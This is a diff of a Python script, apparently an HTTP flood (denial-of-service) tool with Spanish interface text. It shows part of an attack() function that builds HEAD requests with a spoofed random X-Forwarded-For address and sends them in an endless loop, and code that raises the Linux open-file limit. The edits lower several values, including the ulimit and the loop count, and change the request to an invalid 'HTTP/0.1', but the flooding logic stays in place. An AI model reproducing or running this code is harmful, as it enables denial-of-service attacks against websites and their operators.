@@ -27,7 +27,7 @@ def progressbar(it, prefix="", size=60, file=sys.stdout):
     
 import time
 
-for i in progressbar(range(100), "Barra Util: ", 40):
+for i in progressbar(range(10), "Barra Util: ", 40):
     time.sleep(0.3)
     
     
@@ -38,7 +38,7 @@ print("System detected: ", sysOS)
 
 if sysOS == "Linux":
   try:
-    os.system("ulimit -n 300000")
+    os.system("ulimit -n 30")
   except Exception as e:
     print(e)
     print("No se pudo iniciar el script")
@@ -55,7 +55,7 @@ def attack():
   connection = "Connection: null\r\n"
   referer = "Referer: null\r\n"
   forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "HEAD "  + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+  get_host = "HEAD "  + url + " HTTP/0.1\r\nHost: " + ip + "\r\n"
   request = get_host + referer  + connection + forward + "\r\n\r\n"
   while True:
     try:
